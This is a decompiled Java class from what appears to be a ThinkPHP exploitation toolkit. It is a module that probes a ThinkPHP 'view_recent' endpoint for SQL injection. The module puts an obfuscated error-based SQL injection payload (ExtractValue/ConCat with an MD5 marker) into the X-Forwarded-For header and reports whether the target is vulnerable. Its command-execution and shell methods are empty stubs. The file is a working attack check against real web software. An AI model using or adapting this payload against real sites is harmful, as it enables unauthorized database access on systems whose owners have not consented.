/*    */ package dylan.exp;
/*    */ 
/*    */ import dylan.model.BaseExp;
/*    */ import dylan.model.Response;
/*    */ import dylan.tools.HttpTool;
/*    */ import java.util.HashMap;
/*    */ 
/*    */ public class tp_view_recent_xff_sqli
/*    */   implements BaseExp {
/* 10 */   private String results = null;
/* 11 */   private final HashMap<String, String> property = new HashMap<>();
/*    */ 
/*    */   
/*    */   public String vulCheck(String url) {
/* 15 */     url = url + "/index.php?s=/home/article/view_recent/name/1";
/* 16 */     this.property.put("X-Forwarded-For", "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5(2333))))#");
/* 17 */     Response response = HttpTool.get(url, this.property);
/* 18 */     if (response.getText().contains("56540676a129760a")) {
/* 19 */       this.results = "[+] 目标存在" + getClass().getSimpleName() + "漏洞";
/* 20 */       return this.results;
/*    */     } 
/* 22 */     if (response.getError() != null) {
/* 23 */       this.results = "[-] 检测漏洞" + getClass().getSimpleName() + "失败， " + response.getError();
/* 24 */       return this.results;
/*    */     } 
/* 26 */     this.results = "[-] 目标不存在" + getClass().getSimpleName() + "漏洞";
/* 27 */     return this.results;
/*    */   }
/*    */ 
/*    */   
/*    */   public String cmdExec(String url, String cmd) {
/* 32 */     return null;
/*    */   }
/*    */ 
/*    */   
/*    */   public String getShell(String url, String fileName, String content) {
/* 37 */     return null;
/*    */   }
/*    */ }


/* Location:              C:\Users\zyh\Desktop\ThinkPHP.V2.3.by蓝鲸.jar!\dylan\exp\tp_view_recent_xff_sqli.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */